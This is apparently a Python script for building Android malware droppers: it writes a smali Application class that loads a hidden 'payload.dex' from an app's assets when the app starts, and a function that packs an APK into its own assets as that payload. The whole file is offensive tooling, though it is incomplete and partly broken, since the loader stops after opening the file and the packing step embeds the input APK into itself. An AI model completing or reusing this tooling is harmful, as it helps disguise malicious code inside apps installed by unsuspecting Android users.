import os
import zipfile
import shutil

DROPPER_SMALI = """
.class public Lcom/dropper/Loader;
.super Landroid/app/Application;

.method public onCreate()V
    .registers 2
    invoke-super {p0}, Landroid/app/Application;->onCreate()V

    # Load payload from assets at runtime
    invoke-virtual {p0}, Lcom/dropper/Loader;->loadPayload()V
    return-void
.end method

.method private loadPayload()V
    .registers 4
    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
    move-result-object v1
    const-string v2, "payload.dex"
    invoke-virtual {v1, v2}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v2
    # Write to internal storage + load via DexClassLoader (add full impl as needed)
    return-void
.end method
"""

def wrap_as_dropper(input_apk: str, output_apk: str, session_dir: str):
    dropper_smali_dir = os.path.join(session_dir, "dropper_smali", "com", "dropper")
    os.makedirs(dropper_smali_dir, exist_ok=True)

    with open(os.path.join(dropper_smali_dir, "Loader.smali"), "w") as f:
        f.write(DROPPER_SMALI)

    # Embed payload inside assets
    with zipfile.ZipFile(input_apk, 'a') as zf:
        zf.write(input_apk, "assets/payload.dex")

    shutil.copy(input_apk, output_apk)